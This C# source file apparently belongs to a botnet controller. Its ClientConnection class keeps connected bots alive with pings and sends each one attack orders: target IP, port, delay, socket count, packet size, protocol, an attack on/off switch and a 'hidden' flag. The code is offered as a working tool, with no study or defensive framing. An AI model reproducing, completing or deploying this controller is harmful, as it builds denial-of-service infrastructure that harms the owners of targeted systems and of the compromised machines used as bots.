using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BotnetHost
{
    public class ClientConnection
    {
        // Client Variables
        Utilities utilities;
        public Thread thread;
        public Socket socket;
        public string clientName = "", hostOrIP = "localhost", type = "TCP", uid = Guid.NewGuid().ToString();
        public int port = 12345, delay = 15000, sockets = 8, packetSize = 32;
        public Boolean attack = false, restart = false, hidden = false, hasUpdate = true, runThread = true;

        // Constructor
        public ClientConnection (Socket clientSocket, Utilities utils)
        {
            this.utilities = utils;
            this.socket = clientSocket;
            clientName = socket.RemoteEndPoint.ToString();
            thread = new Thread(() => clientThread());
            thread.Start();
        }

        /// <summary>
        /// Client Socket Thread Function
        /// </summary>
        /// <param name="clientGUID">GUID of ClientConnection that this thread is responsible for</param>
        public void clientThread()
        {
            // Infinite loop while client is running
            while (runThread)
            {
                try
                {
                    // Wait for incomming message from client
                    // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE, RE-ENABLE
                    while (false)
                    {
                        // Attempt to read incomming client message
                        try
                        {
                            // Data buffer 
                            byte[] bytes = new Byte[1024];
                            string data = null;
                            int numByte = socket.Receive(bytes);
                            data += Encoding.ASCII.GetString(bytes, 0, numByte);
                            // Make sure message contains something
                            if (data.IndexOf("<EOF>") > -1)
                            {
                                utilities.log("Message recieved from " + this.clientName);
                                // Parse message for command handling
                                data = data.Replace("<EOF>", "");
                                if (data.Contains("["))
                                {
                                    utilities.log("Message: " + data);
                                    // Loop through client commands
                                    string[] messages = data.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                    foreach (string item in messages)
                                    {
                                    }
                                }
                                break;
                            }
                        }
                        catch (Exception e) { } // no message recieved

                    }

                    // Send update message to client (if update is present)
                    if (hasUpdate)
                    {
                        // Build update message for client connection
                        //utilities.log("Sending Client Update: " + this.buildUpdate(new string[0]));
                        utilities.log("Sending Client Update...");
                        byte[] message = Encoding.ASCII.GetBytes(this.buildUpdate(new string[0]));
                        // Send update message and reset necessary variables
                        socket.Send(message);
                        restart = false;
                        hasUpdate = false;
                    }
                    else
                    {
                        try
                        {
                            // Ping clients (check that they are still connected)
                            byte[] message = Encoding.ASCII.GetBytes("ping!");
                            socket.Send(message);
                        } catch (Exception e)
                        {
                            runThread = false;
                        }
                    }
                    // Sleep thread to improve performance
                    Thread.Sleep(1000);
                }
                catch (Exception er)
                {
                    runThread = false;
                }
            }
            // Kill client
            utilities.log(this.clientName + " has been disconnected...");
            killClient();
        }

        /// <summary>
        /// Build updates string for client
        /// </summary>
        /// <param name="otherUpdates"></param>
        /// <returns></returns>
        public string buildUpdate(string[] otherUpdates)
        {
            string[] updates = new string[9 + otherUpdates.Length];

            updates[0] = "IP: " + hostOrIP + "";
            updates[1] = "Port: " + port + "";
            updates[2] = "Delay: " + delay + "";
            updates[3] = "Sockets: " + sockets + "";
            updates[4] = "Packet Size: " + packetSize + "";
            updates[5] = "Type: " + type + "";
            updates[6] = "Attack: " + attack.ToString() + "";
            updates[7] = "Restart: " + restart.ToString() + "";
            updates[8] = "Hidden: " + hidden.ToString() + "";

            string output = "";
            int updateCount = 0;
            for (int i = 0; i < updates.Length; i++)
            {
                if (i != (updates.Length - 1))
                {
                    output += "[" + updates[i] + "],";
                }
                else 
                {
                    if (otherUpdates.Length == 0)
                    {
                        output += "[" + updates[i] + "]";
                    } else
                    {
                        output += "[" + updates[i] + "],";
                    }
                }
                updateCount++;
            }

            for (int s = 0; s < otherUpdates.Length; s++)
            {
                if (s != (otherUpdates.Length - 1))
                {
                    output += "[" + otherUpdates[s] + "],";
                }
                else
                {
                    output += "[" + otherUpdates[s] + "]";
                }
                updateCount++;
            }
            output = output.Replace(",[]", "");

            return output;
        }

        /// <summary>
        /// Kill client and remove from active client list
        /// </summary>
        public void killClient()
        {
            utilities.removeClientConnection(this);
        }
    }
}
